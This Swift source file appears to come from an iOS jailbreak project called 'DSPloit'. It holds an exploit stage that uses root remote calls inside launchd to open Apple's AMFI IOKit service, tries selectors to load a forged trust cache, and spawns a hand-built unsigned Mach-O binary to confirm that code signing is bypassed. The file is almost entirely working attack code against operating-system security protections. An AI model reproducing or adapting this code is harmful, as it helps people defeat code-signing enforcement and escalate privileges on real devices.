//
//  exp_launchd_tc_load.swift
//  DSPloit
//
//  EXPERIMENT: Load trust cache via launchd RemoteCall + IOKit AMFI
//  ═══════════════════════════════════════════════════════════════════
//  Approach: Use launchd (PID 1, proven RC working) to call IOKit
//  interface of AppleMobileFileIntegrity kext to load trust cache.
//
//  launchd has root privileges and can open IOKit services.
//  We connect to AMFI kext via IOServiceOpen, then call
//  IOConnectCallStructMethod with trust cache data.
//
//  Created by Royan | 2026-05-30
//

import Foundation
import UIKit
import CommonCrypto

final class ExpLaunchdTCLoad {
    static let shared = ExpLaunchdTCLoad()
    private var results: [String] = []
    
    private func log(_ msg: String) {
        results.append(msg)
        globallogger.log("(exp_launchd_tc) \(msg)")
    }
    
    func runAll() -> [String] {
        results.removeAll()
        
        log("── launchd Trust Cache Load ──")
        log("iOS \(UIDevice.current.systemVersion)")
        log("")
        
        guard dspmgr.shared.dsready else {
            log("❌ KRW not active")
            return results
        }
        
        #if !DISABLE_REMOTECALL
        guard dspmgr.shared.rcready else {
            log("❌ RemoteCall not active")
            return results
        }
        
        // Step 1: Build TC + test binary
        log("[1/5] Building trust cache...")
        let testBin = buildTestBinary()
        let cdhash = sha256Truncated(testBin)
        let tcData = buildTC(cdhash: cdhash)
        log("CDHash: \(cdhash.map { String(format: "%02x", $0) }.joined())")
        log("TC size: \(tcData.count) bytes")
        
        // Step 2: Write files to Documents
        log("")
        log("[2/5] Writing files...")
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
        let tcPath = docs + "/launchd_tc.bin"
        let binPath = docs + "/launchd_test"
        
        do {
            try tcData.write(to: URL(fileURLWithPath: tcPath))
            try testBin.write(to: URL(fileURLWithPath: binPath))
            log("✅ Files written")
        } catch {
            log("❌ Write failed: \(error.localizedDescription)")
            return results
        }
        
        // Step 3: Connect to launchd and probe available functions
        log("")
        log("[3/5] Connecting to launchd...")
        
        let semaphore = DispatchSemaphore(value: 0)
        var probeResult: String = ""
        
        RootExecutor.shared.executeAsRoot(operation: "tc_probe") { rc in
            let RTLD_DEFAULT = UInt64(bitPattern: -2)
            var found: [(String, UInt64)] = []
            
            // Probe for trust cache / IOKit functions available in launchd
            let funcs = [
                "IOServiceGetMatchingService",
                "IOServiceMatching",
                "IOServiceOpen",
                "IOConnectCallStructMethod",
                "IOConnectCallMethod",
                "open", "read", "mmap",
                "csops", "csops_audittoken",
            ]
            
            for name in funcs {
                let nameAddr = remote_alloc_str(rc, name)
                let addr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, nameAddr)
                RootExecutor.rcall(rc, "free", nameAddr)
                if addr != 0 && addr != UInt64(bitPattern: -1) {
                    found.append((name, addr))
                }
            }
            
            probeResult = found.map { "\($0.0)=0x\(String($0.1, radix: 16, uppercase: false))" }.joined(separator: "\n")
            return (true, "probed \(found.count) funcs", UInt64(found.count))
        }
        
        // Wait
        DispatchQueue.global().asyncAfter(deadline: .now() + 12) { semaphore.signal() }
        _ = semaphore.wait(timeout: .now() + 15)
        
        if let result = RootExecutor.shared.lastResult, result.operation == "tc_probe" {
            log("✅ launchd connected (\(result.returnValue) funcs found)")
            for line in probeResult.split(separator: "\n").prefix(6) {
                log("   \(line)")
            }
        } else {
            log("❌ launchd connection timeout")
            return results
        }
        
        // Step 4: Try to load trust cache via IOKit in launchd context
        log("")
        log("[4/5] Loading TC via IOKit AMFI...")
        
        var loadResult = ""
        let sem2 = DispatchSemaphore(value: 0)
        
        RootExecutor.shared.executeAsRoot(operation: "tc_iokit_load") { rc in
            let RTLD_DEFAULT = UInt64(bitPattern: -2)
            let mem = rc.trojanMem
            
            // Get IOKit function addresses
            let ioMatchingAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                remote_alloc_str(rc, "IOServiceMatching"))
            let ioGetMatchAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                remote_alloc_str(rc, "IOServiceGetMatchingService"))
            let ioOpenAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                remote_alloc_str(rc, "IOServiceOpen"))
            let ioCallAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                remote_alloc_str(rc, "IOConnectCallStructMethod"))
            
            guard ioMatchingAddr != 0 && ioGetMatchAddr != 0 && ioOpenAddr != 0 else {
                loadResult = "IOKit functions not found in launchd"
                return (false, loadResult, 0)
            }
            
            // IOServiceMatching("AppleMobileFileIntegrity")
            let amfiName = remote_alloc_str(rc, "AppleMobileFileIntegrity")
            let matching = RootExecutor.rcallAddr(rc, ioMatchingAddr, amfiName)
            
            guard matching != 0 else {
                loadResult = "IOServiceMatching returned NULL"
                return (false, loadResult, 0)
            }
            
            // IOServiceGetMatchingService(kIOMainPortDefault, matching)
            let service = RootExecutor.rcallAddr(rc, ioGetMatchAddr, 0, matching)
            
            guard service != 0 else {
                loadResult = "AMFI service not found (service=0)"
                return (false, loadResult, 0)
            }
            loadResult += "AMFI service=0x\(String(service, radix: 16))\n"
            
            // IOServiceOpen(service, mach_task_self(), 0, &conn)
            let connAddr = mem + 0x2800
            rc[connAddr].setValue64(0)
            
            // Get mach_task_self_ in launchd context
            let taskSelfAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                remote_alloc_str(rc, "mach_task_self_"))
            var taskSelf: UInt64 = 0
            if taskSelfAddr != 0 {
                // Read the value of mach_task_self_ global
                taskSelf = rc[taskSelfAddr].value64()
                if taskSelf == 0 { taskSelf = 0x103 } // fallback: typical mach_task_self value
            } else {
                taskSelf = 0x103
            }
            
            let kr = RootExecutor.rcallAddr(rc, ioOpenAddr, service, taskSelf, 0, connAddr)
            let conn = rc[connAddr].value32()
            
            loadResult += "IOServiceOpen: kr=0x\(String(kr, radix: 16)) conn=0x\(String(conn, radix: 16))\n"
            
            if kr != 0 || conn == 0 {
                loadResult += "❌ Cannot open AMFI service (kr=\(kr))"
                return (false, loadResult, UInt64(kr))
            }
            
            loadResult += "✅ AMFI IOKit connection opened!\n"
            
            // Now call IOConnectCallStructMethod with trust cache data
            // Selector for trust cache load needs to be determined
            // Try common selectors (0, 1, 2...)
            if ioCallAddr != 0 {
                // Write TC data to remote memory
                let tcBufAddr = mem + 0x3000
                let tcSize = tcData.count
                tcData.withUnsafeBytes { buf in
                    rc.remote_write(tcBufAddr, from: buf.baseAddress!, size: UInt64(tcSize))
                }
                
                let outBuf = mem + 0x4000
                let outSizeAddr = mem + 0x4800
                rc[outSizeAddr].setValue64(256)
                
                // Try selectors 0-5
                for sel: UInt32 in 0..<6 {
                    let callKr = RootExecutor.rcallAddr(rc, ioCallAddr,
                        UInt64(conn), UInt64(sel), tcBufAddr, UInt64(tcSize), outBuf, outSizeAddr)
                    
                    if callKr == 0 {
                        loadResult += "✅ Selector \(sel) returned SUCCESS!\n"
                        return (true, loadResult, UInt64(sel))
                    } else if callKr != 0xe00002c2 { // not MIG_BAD_ID
                        loadResult += "Selector \(sel): 0x\(String(callKr, radix: 16))\n"
                    }
                }
                
                loadResult += "No selector accepted TC data"
            }
            
            return (false, loadResult, 0)
        }
        
        DispatchQueue.global().asyncAfter(deadline: .now() + 12) { sem2.signal() }
        _ = sem2.wait(timeout: .now() + 15)
        
        if let result = RootExecutor.shared.lastResult, result.operation == "tc_iokit_load" {
            for line in loadResult.split(separator: "\n") {
                log("   \(line)")
            }
            if result.success {
                log("✅ Trust cache loaded via IOKit!")
            } else {
                log("⚠️ IOKit load incomplete: \(result.message)")
            }
        } else {
            log("❌ IOKit load timeout")
        }
        
        // Step 5: Verify
        log("")
        log("[5/5] Testing unsigned binary spawn...")
        
        let sem3 = DispatchSemaphore(value: 0)
        
        RootExecutor.shared.executeAsRoot(operation: "tc_verify") { rc in
            let pathAddr = remote_alloc_str(rc, binPath)
            
            // chmod 755 first
            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
            
            let pidAddr = rc.trojanMem + 0xA00
            rc[pidAddr].setValue32(0)
            let argvBase = rc.trojanMem + 0xA10
            rc[argvBase].setValue64(pathAddr)
            rc[argvBase + 8].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argvBase, 0)
            let pid = rc[pidAddr].value32()
            RootExecutor.rcall(rc, "free", pathAddr)
            
            return (ret == 0 && pid != 0, "ret=\(ret) pid=\(pid)", UInt64(pid))
        }
        
        DispatchQueue.global().asyncAfter(deadline: .now() + 12) { sem3.signal() }
        _ = sem3.wait(timeout: .now() + 15)
        
        if let result = RootExecutor.shared.lastResult, result.operation == "tc_verify" {
            if result.success {
                log("✅✅✅ UNSIGNED BINARY SPAWNED! PID=\(result.returnValue)")
                log("🎉 FULL JAILBREAK ACHIEVED!")
            } else {
                log("❌ Spawn failed: \(result.message)")
            }
        }
        
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
        
        return results
    }
    
    // MARK: - Helpers
    
    private func sha256Truncated(_ data: Data) -> Data {
        var hash = [UInt8](repeating: 0, count: Int(CC_SHA256_DIGEST_LENGTH))
        data.withUnsafeBytes { CC_SHA256($0.baseAddress, CC_LONG(data.count), &hash) }
        return Data(hash.prefix(20))
    }
    
    private func buildTC(cdhash: Data) -> Data {
        var tc = Data()
        var version: UInt32 = 2
        tc.append(Data(bytes: &version, count: 4))
        var uuid = UUID().uuid
        tc.append(Data(bytes: &uuid, count: 16))
        var count: UInt32 = 1
        tc.append(Data(bytes: &count, count: 4))
        tc.append(cdhash)
        tc.append(contentsOf: [2, 0, 0, 0]) // hash_type=SHA256, flags=0, pad
        return tc
    }
    
    private func buildTestBinary() -> Data {
        var bin = Data()
        let header: [UInt8] = [
            0xCF, 0xFA, 0xED, 0xFE, 0x0C, 0x00, 0x00, 0x01,
            0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
            0x02, 0x00, 0x00, 0x00, 0x60, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ]
        bin.append(contentsOf: header)
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0] = 0x19; seg[4] = 0x48
        seg[8] = 0x5F; seg[9] = 0x5F; seg[10] = 0x54; seg[11] = 0x45; seg[12] = 0x58; seg[13] = 0x54
        seg[28] = 0x01; seg[32] = 0x00; seg[33] = 0x40; seg[40] = 0x00; seg[41] = 0x40
        seg[48] = 0x05; seg[52] = 0x05
        bin.append(contentsOf: seg)
        var thread = [UInt8](repeating: 0, count: 280)
        thread[0] = 0x05; thread[4] = 0x18; thread[5] = 0x01; thread[8] = 0x06; thread[12] = 0x44
        thread[272] = 0x80; thread[273] = 0x01; thread[276] = 0x01
        bin.append(contentsOf: thread)
        while bin.count < 0x180 { bin.append(0) }
        bin.append(contentsOf: [0x00, 0x00, 0x80, 0xD2, 0x30, 0x00, 0x80, 0xD2, 0x01, 0x10, 0x00, 0xD4])
        while bin.count < 0x4000 { bin.append(0) }
        return bin
    }
}
